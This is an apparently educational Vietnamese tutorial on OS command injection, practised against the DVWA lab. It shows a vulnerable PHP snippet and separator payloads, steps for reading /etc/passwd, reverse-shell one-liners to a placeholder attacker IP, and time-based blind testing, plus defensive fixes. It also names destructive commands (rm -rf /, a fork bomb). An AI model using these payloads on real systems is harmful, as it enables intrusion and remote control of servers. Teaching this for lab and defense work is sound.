# 🐚 Mission 18: Command Injection (OS Command Injection)

> **📜 Mission Brief:** Các lập trình viên đôi khi lười biếng. Thay vì viết code để xử lý một tác vụ (như ping, nén file, xử lý ảnh), họ gọi trực tiếp lệnh của hệ điều hành (System Shell) để làm việc đó.
>
> **Command Injection** xảy ra khi Hacker lừa ứng dụng web thực thi các câu lệnh hệ thống (Linux/Windows) tùy ý.
>
>   * **Hậu quả:** RCE (Remote Code Execution). Bạn có thể chiếm quyền điều khiển server, đọc toàn bộ file hệ thống, thậm chí mở Reverse Shell về máy mình.

-----

## 🏗️ MODULE 1: CƠ CHẾ "KẺ GIẤU MẶT"

Hãy xem xét một đoạn code PHP xử lý tính năng "Ping địa chỉ IP" trên web:

```php
// Code Lỗi
$target = $_GET['ip'];
system("ping -c 4 " . $target);
```

1.  **Người dùng tốt:** Nhập `8.8.8.8`.
      * Lệnh chạy: `ping -c 4 8.8.8.8` → Kết quả trả về bình thường.
2.  **Hacker:** Nhập `8.8.8.8; whoami`.
      * Lệnh chạy: `ping -c 4 8.8.8.8; whoami`
      * Dấu chấm phẩy `;` trong Linux nghĩa là: *"Chạy xong lệnh trước đi, rồi chạy tiếp lệnh sau"*.
      * **Kết quả:** Server vừa Ping xong, nó sẽ chạy tiếp lệnh `whoami` và in ra tên người dùng đang chạy web server (thường là `www-data`).

-----

## ☠️ MODULE 2: CÁC KÝ TỰ "MA THUẬT" (SEPARATORS)

Để tiêm lệnh, bạn cần các ký tự ngăn cách (Separators) để ngắt câu lệnh gốc và chèn câu lệnh của mình vào.

| Ký tự | Hệ điều hành | Ý nghĩa | Ví dụ |
| :--- | :--- | :--- | :--- |
| **`;`** | Linux | Chạy lệnh 1 xong, chạy tiếp lệnh 2 (Bất kể lệnh 1 đúng hay sai). | `127.0.0.1; ls -la` |
| **`&&`** | Linux/Win | Chỉ chạy lệnh 2 NẾU lệnh 1 thành công. | `127.0.0.1 && dir` |
| **`||`** | Linux/Win | Chỉ chạy lệnh 2 NẾU lệnh 1 thất bại. | `127.0.0.1 || whoami` |
| **`|`** | Linux/Win | Pipe (Lấy đầu ra lệnh 1 làm đầu vào lệnh 2). | `cat file.txt | grep pass` |
| **`$()`** | Linux | Thực thi lệnh trong ngoặc trước (Command Substitution). | `ping $(whoami).site.com` |

-----

## 🧪 MODULE 3: QUY TRÌNH KHAI THÁC (THỰC CHIẾN)

**Môi trường:** DVWA (Damn Vulnerable Web App) - Phần Command Injection.
**Mục tiêu:** Một ô input yêu cầu nhập IP để Ping.

### Bước 1: Trinh sát (Fingerprinting)

Đầu tiên, hãy dùng chức năng như một người bình thường.

  * Input: `127.0.0.1`
  * Output: Thấy kết quả lệnh ping trả về. → Web server đang gọi lệnh hệ thống.

### Bước 2: Kiểm tra lỗ hổng (Payloads an toàn)

Thử các ký tự ngăn cách để xem server có thực thi lệnh phụ không.

  * Payload 1: `127.0.0.1; whoami`
  * Payload 2: `127.0.0.1 && whoami`
  * Payload 3: `127.0.0.1 | id`

→ **Dấu hiệu thành công:** Ngoài kết quả ping, bạn thấy thêm dòng chữ như `www-data`, `root`, hoặc `uid=33(www-data)...`.

### Bước 3: Đọc file nhạy cảm (Information Disclosure)

Nếu là Linux, file quý giá nhất là `/etc/passwd` (chứa danh sách user).

  * Payload: `127.0.0.1; cat /etc/passwd`

Nếu là Windows, thử đọc file `boot.ini` hoặc `win.ini`.

  * Payload: `127.0.0.1 && type C:\Windows\win.ini`

### Bước 4: Leo thang - Reverse Shell (Game Over)

Thay vì gõ từng lệnh trên web rất cực, hãy dùng **Netcat** (Mission 12) để server kết nối ngược về máy bạn.

1.  **Trên máy Hacker:** Mở cổng chờ.
    ```bash
    nc -lvnp 4444
    ```
2.  **Trên Web (Ô Input):** Tiêm lệnh kết nối (Cần thay đổi tùy môi trường server có `nc` hay không).
      * Payload: `127.0.0.1; nc -e /bin/bash <IP_HACKER> 4444`
      * Hoặc (Bash reverse shell): `127.0.0.1; bash -i >& /dev/tcp/<IP_HACKER>/4444 0>&1`

-----

## 🕵️ MODULE 4: BLIND COMMAND INJECTION (SQLi MÙ)

Đôi khi Server thực thi lệnh nhưng **không in kết quả ra màn hình**. Làm sao biết mình đã hack thành công?
→ Hãy dùng **Thời gian (Time-based)**.

  * Payload: `127.0.0.1; sleep 10`
  * **Dấu hiệu:** Nếu trang web quay vòng vòng đúng 10 giây rồi mới load xong → **Lỗ hổng tồn tại.** Server đã "ngủ" theo lệnh của bạn.

-----

## 🛡️ MODULE 5: PHÒNG THỦ (BLUE TEAM)

Làm sao để code an toàn?

1.  **Tránh xa các hàm thực thi lệnh:** Hạn chế tối đa dùng `system()`, `exec()`, `passthru()`. Hãy dùng thư viện có sẵn của ngôn ngữ lập trình (Ví dụ: Dùng thư viện nén ảnh thay vì gọi lệnh `tar`).
2.  **Input Validation (Whitelist):**
      * Nếu ô input chỉ cần nhập IP, hãy dùng Regex để đảm bảo người dùng CHỈ nhập số và dấu chấm. Cấm tiệt `;`, `&`, `|`.
3.  **Sử dụng hàm Escape:**
      * Trong PHP: Dùng `escapeshellarg()` hoặc `escapeshellcmd()`. Nó sẽ biến dấu `;` thành chuỗi văn bản vô hại.
      * Ví dụ: `127.0.0.1; ls` → `'127.0.0.1; ls'` (Hệ thống hiểu đây là một cái địa chỉ IP kỳ quặc, chứ không phải 2 lệnh).

-----

## ⚠️ CẢNH BÁO AN TOÀN

> **Tuyệt đối không dùng lệnh phá hoại:**
>
>   * Không dùng `rm -rf /` (Xóa sạch server).
>   * Không dùng `:(){ :|:& };:` (Fork bomb - làm treo server).
>   * Trong môi trường Lab/CTF, chỉ nên dùng `whoami`, `id`, `ls`, `cat /etc/passwd` để chứng minh lỗ hổng (Proof of Concept).

-----

**Mission Completed!**
Bạn đã biết cách biến Web Server thành nô lệ của mình.

**🚀 NEXT MISSION:** Chúng ta đã đi qua 18 Mission nền tảng.
Bạn có muốn tổng kết lại bằng **Mission 19: CTF Walkthrough - Giải một bài CTF tổng hợp** (Kết hợp Nmap, Gobuster, và một lỗ hổng Web) để thấy quy trình thực tế từ A-Z không?